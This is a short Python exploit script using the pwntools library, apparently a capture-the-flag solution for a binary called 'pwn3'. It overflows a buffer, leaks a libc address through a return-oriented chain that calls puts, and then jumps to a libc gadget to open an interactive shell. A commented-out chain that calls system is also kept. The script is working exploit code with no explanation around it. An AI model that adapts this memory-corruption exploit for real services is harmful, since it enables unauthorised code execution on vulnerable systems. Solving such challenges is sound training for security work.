from pwn import *

context.binary = exe = ELF('./pwn3')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x401232

io = process()
gdb.attach(io, api=True)

# Stage 1: Leak libc
io.recvuntil(b'flag?\n')
payload = b'i'*40
payload += p64(pop_rdi) + p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
io.sendline(payload)
io.recvline() # fake flag
leaks = u64(io.recvline(keepends=False).ljust(8, b'\x00'))
libc.address = leaks - libc.sym['puts']

# Stage 2: Shell
io.recvuntil(b'flag?\n')
# payload = b'i'*40
# payload += p64(pop_rdi) + p64(libc.address+0x1d8698) + p64(pop_rdi+1) + p64(libc.sym['system'])
# payload += p64(exe.sym['main'])

payload = b'i'*32 + p64(0x404070+0x78)
payload += p64(libc.address+0xebcf8)
io.sendline(payload)

io.interactive()
